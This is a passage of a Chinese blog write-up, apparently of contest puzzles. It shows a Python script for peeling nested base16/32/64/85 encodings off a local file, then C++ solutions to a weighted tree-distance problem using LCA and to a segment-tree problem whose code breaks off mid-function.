</span></span><span class="line"><span class="cl"><span class="n">b16</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;F#&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0`&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;MQ==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;31&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GE======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b32</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;G5&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&amp;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mg==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;32&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GI======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b64</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;GX&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1B&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Mw==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;33&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GM======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">b85</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;Gy&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;NA==&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;34&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;GQ======&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">EncoderSet</span> <span class="o">=</span> <span class="p">[</span><span class="n">a85decode</span><span class="p">,</span> <span class="n">b16decode</span><span class="p">,</span> <span class="n">b32decode</span><span class="p">,</span> <span class="n">b64decode</span><span class="p">,</span> <span class="n">b85decode</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">point</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">point</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;.</span><span class="se">\\</span><span class="s1">secret.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">point</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;w1ndNB&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">a85</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">b16</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">b32</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">b64</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">n</span><span class="p">]</span> <span class="ow">in</span> <span class="n">b85</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;ERROR OR SUCCESS!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;secret.txt&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">[</span><span class="n">point</span><span class="p">](</span><span class="n">s</span><span class="p">[</span><span class="n">n</span><span class="o">+</span><span class="mi">6</span><span class="p">:])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></div><p>然后!!! 我就迷茫了&hellip; 无论如何都匹配不上.. 循环只执行一遍不做任何处理就会退出..</p>
<p>于是&hellip; 怎么能放弃呢?!</p>
<p>我就改动了一下, 把循环去掉, 然后人眼识别, 手动修改解码方式和位置&hellip; 手撕了三十一层, 得到<code>flag</code>.</p>
<h3 id="tree-distance">Tree Distance</h3>
<p>想让我写算法解释吗? 不可能的&hellip; 我还想多活几年&hellip; 我把代码放出来吧&hellip;</p>
<p>算法是倍增求LCA, 可以百度了解一下.</p>
<p>( 其实本题最开始是网络版的, 网络版数据简单得多并且没有时间限制, 可惜我不会网络编程, 于是就走上了OJ这条不归之路 T_T , 数据太坑人了 )</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">// 再过不了我就换地方重写QAQ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##include &lt;cstdio&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cstring&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">int</span> <span class="n">maxn</span> <span class="o">=</span> <span class="mf">5e5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">int</span> <span class="n">maxm</span> <span class="o">=</span> <span class="mf">8e5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="nc">node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">to</span><span class="p">,</span> <span class="n">next</span><span class="p">,</span> <span class="n">w</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">edges</span><span class="p">[</span><span class="n">maxm</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">head</span><span class="p">[</span><span class="n">maxn</span><span class="p">],</span> <span class="n">cnt</span><span class="p">,</span> <span class="n">dp</span><span class="p">[</span><span class="n">maxn</span><span class="p">][</span><span class="mi">20</span><span class="p">],</span> <span class="n">dep</span><span class="p">[</span><span class="n">maxn</span><span class="p">],</span> <span class="n">dist</span><span class="p">[</span><span class="n">maxn</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">addedge</span><span class="p">(</span><span class="kt">int</span> <span class="n">u</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">,</span> <span class="kt">int</span> <span class="n">w</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">to</span> <span class="o">=</span> <span class="n">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">to</span> <span class="o">=</span> <span class="n">u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">w</span> <span class="o">=</span> <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">w</span> <span class="o">=</span> <span class="n">w</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">next</span> <span class="o">=</span> <span class="n">head</span><span class="p">[</span><span class="n">u</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">next</span> <span class="o">=</span> <span class="n">head</span><span class="p">[</span><span class="n">v</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">head</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">=</span> <span class="n">cnt</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">head</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">=</span> <span class="n">cnt</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">dfs</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">dep</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="o">=</span> <span class="n">dep</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dp</span><span class="p">[</span><span class="n">s</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">dep</span><span class="p">[</span><span class="n">s</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">dp</span><span class="p">[</span><span class="n">s</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">dp</span><span class="p">[</span><span class="n">s</span><span class="p">][</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]][</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">head</span><span class="p">[</span><span class="n">s</span><span class="p">];</span> <span class="n">i</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">edges</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">edges</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">to</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">t</span> <span class="o">==</span> <span class="n">x</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">dist</span><span class="p">[</span><span class="n">t</span><span class="p">]</span> <span class="o">=</span> <span class="n">dist</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="o">+</span> <span class="n">edges</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">w</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">dfs</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">LCA</span><span class="p">(</span><span class="kt">int</span> <span class="n">u</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">dep</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">dep</span><span class="p">[</span><span class="n">u</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">u</span> <span class="o">^=</span> <span class="n">v</span> <span class="o">^=</span> <span class="n">u</span> <span class="o">^=</span> <span class="n">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">dep</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">-</span> <span class="n">dep</span><span class="p">[</span><span class="n">v</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">u</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">u</span><span class="p">][</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">u</span> <span class="o">==</span> <span class="n">v</span><span class="p">)</span> <span class="k">return</span> <span class="n">u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">dep</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">dp</span><span class="p">[</span><span class="n">u</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">dp</span><span class="p">[</span><span class="n">v</span><span class="p">][</span><span class="n">i</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">u</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">u</span><span class="p">][</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="n">v</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">v</span><span class="p">][</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">dp</span><span class="p">[</span><span class="n">u</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">WDNMD</span><span class="p">(</span><span class="kt">int</span> <span class="n">u</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">z</span> <span class="o">=</span> <span class="n">LCA</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">dist</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">dist</span><span class="p">[</span><span class="n">z</span><span class="p">]</span> <span class="o">+</span> <span class="n">dist</span><span class="p">[</span><span class="n">v</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">n</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">m</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">memset</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">head</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">w</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">addedge</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">);</span> <span class="c1">// 强行无向...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">dep</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dp</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dfs</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">m</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">WDNMD</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h3 id="f1gs-diamond">F1@g‘s diamond</h3>
<p>代码一扔我就溜~</p>
<p>算法是线段树, 区间维护.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include&lt;cstdio&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cstring&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">int</span> <span class="n">INF</span> <span class="o">=</span> <span class="mf">1e9</span> <span class="o">+</span> <span class="mi">7</span><span class="p">,</span> <span class="n">MAXN</span> <span class="o">=</span> <span class="mf">5e5</span> <span class="o">+</span> <span class="mi">10</span><span class="p">,</span> <span class="n">MAXNODE</span> <span class="o">=</span> <span class="n">MAXN</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">,</span> <span class="n">MAXM</span> <span class="o">=</span> <span class="mf">1e5</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">N</span><span class="p">,</span> <span class="n">M</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">LL</span> <span class="n">tmp</span><span class="p">[</span><span class="n">MAXN</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="nc">node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">LL</span> <span class="n">sum</span><span class="p">,</span> <span class="n">maxl</span><span class="p">,</span> <span class="n">maxr</span><span class="p">,</span> <span class="n">maxv</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">node</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">sum</span> <span class="o">=</span> <span class="n">maxl</span> <span class="o">=</span> <span class="n">maxr</span> <span class="o">=</span> <span class="n">maxv</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">A</span><span class="p">[</span><span class="n">MAXNODE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">inline</span> <span class="kt">void</span> <span class="nf">push_up</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">sum</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">sum</span> <span class="o">+</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxl</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxl</span><span class="p">,</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">sum</span> <span class="o">+</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxv</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxr</span> <span class="o">+</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxl</span><span class="p">,</span> <span class="n">max</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxv</span><span class="p">,</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxv</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxr</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxr</span><span class="p">,</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxr</span> <span class="o">+</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">sum</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">l</span><span class="p">,</span> <span class="kt">int</span> <span class="n">r</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">l</span> <span class="o">==</span> <span class="n">r</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">sum</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxl</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxr</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxv</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">[</span><span class="n">l</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
